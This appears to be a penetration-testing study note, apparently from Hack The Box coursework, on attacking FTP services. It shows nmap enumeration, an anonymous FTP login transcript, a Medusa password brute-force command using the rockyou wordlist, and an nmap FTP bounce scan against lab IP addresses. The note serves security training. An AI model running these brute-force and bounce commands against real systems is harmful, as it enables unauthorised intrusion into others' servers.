## Enumeration
#### Nmap

```shell
3kjS@htb[/htb]$ sudo nmap -sC -sV -p 21 192.168.2.142
```
## Misconfigurations
#### Anonymous Authentication

```shell
3kjS@htb[/htb]$ ftp 192.168.2.142

Connected to 192.168.2.142. 
220 (vsFTPd 2.3.4) 
Name (192.168.2.142:kali): anonymous 
331 Please specify the password. 
Password: 
230 Login successful. 
Remote system type is UNIX. 
Using binary mode to transfer files. 
ftp> ls 
200 PORT command successful. Consider using PASV. 
150 Here comes the directory listing. 
-rw-r--r-- 1 0 0 9 Aug 12 16:51 test.txt 
226 Directory send OK.
```
## Protocol Specifics Attacks
### Brute Forcing
#### Brute Forcing with Medusa

```shell
3kjS@htb[/htb]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
```
#### FTP Bounce Attack
![[Pasted image 20260513203428.png]]

```shell
3kjS@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```
